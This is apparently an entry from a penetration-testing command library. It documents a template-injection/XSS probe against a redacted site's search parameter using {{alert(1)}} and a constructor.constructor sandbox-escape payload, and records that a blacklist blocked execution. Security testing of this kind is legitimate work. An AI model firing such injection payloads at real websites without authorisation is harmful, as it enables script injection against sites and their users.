---
id: cmd-uuid-2
data: 'www.███/News/Speeches?Search={{alert(1)}}'
name: attempt-js-execution
tags:
  - xss-test
type: command
output: No alert due to blacklist
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.256Z'
verified: false
validated: true
submitted: true
---
# attempt-js-execution

## Command

```bash
# Browser URL: www.███/News/Speeches?Search={{alert(1)}}
```

## Description

This command attempts direct JavaScript execution via template injection to identify blacklisted functions in the frontend engine.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Search | JS code like {{alert(1)}} | Yes |

## Examples

### Basic Usage

```bash
www.███/News/Speeches?Search={{alert(1)}}
```

### Advanced Usage

Try other functions like {{constructor.constructor('alert(1)')()}}.

```bash
www.███/News/Speeches?Search={{constructor.constructor('alert(1)')()}}
```

## Expected Output

Page loads without executing the alert, confirming blacklist on methods like alert().

## Related

- [[Related Procedure: Attempt-JavaScript-Execution-in-Templates]]
